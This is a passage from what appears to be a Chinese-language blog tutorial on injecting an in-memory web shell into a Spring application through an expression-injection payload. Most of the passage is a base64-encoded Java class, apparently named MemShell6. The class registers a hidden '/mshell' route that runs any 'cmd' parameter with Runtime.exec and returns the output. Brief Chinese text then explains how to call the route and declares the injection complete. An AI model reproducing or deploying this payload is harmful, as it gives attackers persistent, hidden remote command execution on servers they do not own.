mluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwA3QDeAQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwEABXBhdGhzAQAPamF2YS9sYW5nL0NsYXNzDADfAOAHALkMAOEA4gEAEGphdmEvbGFuZy9PYmplY3QBAAcvbXNoZWxsDADjAOQBABdnZXRCdWlsZGVyQ29uZmlndXJhdGlvbgwA5QDmAQAHb3B0aW9ucwEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb24BABRCdWlsZGVyQ29uZmlndXJhdGlvbgEADElubmVyQ2xhc3NlcwEABWJ1aWxkAQAJTWVtU2hlbGw2AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDADnAOgMANYAOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAHaXNFbXB0eQEAAygpWgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAARuZXh0AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEAD3ByaW50U3RhY2tUcmFjZQEAGChMamF2YS9pby9QcmludFdyaXRlcjspVgEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBAAxnZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7SSlMamF2YS9sYW5nL09iamVjdDsBAAdnZXRCZWFuAQAlKExqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAD3JlZ2lzdGVyTWFwcGluZwEAbihMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbztMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOylWACEANAAsAAAAAAADAAEAOgA7AAEAPAAAAC8AAQABAAAABSq3AAGxAAAAAgA9AAAABgABAAAADgA+AAAADAABAAAABQA/AEAAAAABAEEAQgACADwAAAIAAAQACgAAALwrEgK5AAMCAE4txgCTLbYABJoAjBIFuAAGtgAHEgi2AAk2BBUEmQAYBr0AClkDEgtTWQQSDFNZBS1TpwAVBr0AClkDEg1TWQQSDlNZBS1TOgW4AA8ZBbYAEDoGGQa2ABE6B7sAElkZB7cAExIUtgAVOggZCLYAFpkACxkItgAXpwAFEhg6CSy5ABkBABkJtgAaLLkAGQEAtgAbpwAOLLkAGQEAEhy2ABqnABNOLSy5ABkBALYAHqcABToEsQACAAAAqACrAB0ArAC2ALkAHQADAD0AAABCABAAAABAAAkAQQAUAEIAIwBDAFEARABbAEUAYgBGAHIARwCGAEgAkQBJAJoASgCdAEsAqABPAKsATQCsAE4AuwBQAD4AAABwAAsAIwB3AEMARAAEAFEASQBFAEYABQBbAD8ARwBIAAYAYgA4AEkASgAHAHIAKABLAEwACACGABQATQBOAAkACQCfAEEATgADAKwADwBPAFAAAwAAALwAPwBAAAAAAAC8AFEAUgABAAAAvABTAFQAAgBVAAAAZAAJ/QA9BwBWAVEHACn/ADIACQcAVwcAWAcAWQcAVgEHACkHAFoHAFsHAFwAAEEHAFb/ABgABAcAVwcAWAcAWQcAVgAA+gAKQgcAXf8ADQAEBwBXBwBYBwBZBwBdAAEHAF36AAEAXgAAAAkCAFEAAABTAAAACABfADsAAQA8AAACQwAJAAkAAAD/uAAfwAAgSyoSIQO2ACLAACNMKxIkuQAlAgDAACRNEiYSJwS9AChZAxIpU7YAKk4tBLYAKy0BBL0ALFkDBL0AClkDEi1TU7YALjoEEiQSLwO9ACi2ACo6BRkFBLYAKxkFLAO9ACy2AC46BhkGxgAvGQS2ADASMQS9AChZAxIyU7YAKjoHGQcEtgArGQcZBAS9ACxZAxkGU7YALlenAAU6BRkEtgAwEjMDvQAotgAqOgUZBQS2ACsZBRkEA70ALLYALsAAJjoGuwA0WbcANToHEjQSAgW9AChZAxI2U1kEEjdTtgAqOggZCAS2ACssGQYZBxkItgA4pwAISyq2ADmxAAIASwCbAJ4AHQAAAPYA+QAdAAMAPQAAAGoAGgAAABMABwAUABIAGAAeABsALwAcADQAHQBLACEAWAAiAF4AIwBqACUAbwAmAIQAJwCKACgAmwAsAJ4AKgCgAC8AsAAwALYAMQDGADQAzwA1AOYANgDsADcA9gA7APkAOQD6ADoA/gA8AD4AAACEAA0AhAAXAGAAYQAHAFgAQwBiAGEABQBqADEAYwBkAAYABwDvAGUAZgAAABIA5ABnAGgAAQAeANgAaQBqAAIALwDHAGsAYQADAEsAqwBsAGQABACwAEYAbQBhAAUAxgAwAG4AbwAGAM8AJwBwAEAABwDmABAAcQBhAAgA+gAEAE8AUAAAAFUAAAAoAAX/AJsABQcAcgcAcwcAdAcAdQcAdgAAQgcAXQH/AFgAAAABBwBdBAACAHcAAAACAHgAsAAAAAoAAQAyACYArwAJ'), 
        T(org.springframework.util.ClassUtils).getDefaultClassLoader()
    ).newInstance()
    

就可以愉快的执行命令了

![image-20251208215324717](https://img2024.cnblogs.com/blog/3633805/202512/3633805-20251211203609148-1255396090.png)

我们访问mshell路由，传递cmd参数就是我们要执行的命令

![image-20251208215409385](https://img2024.cnblogs.com/blog/3633805/202512/3633805-20251211203615640-1218303520.png)

至此内存马注入完成。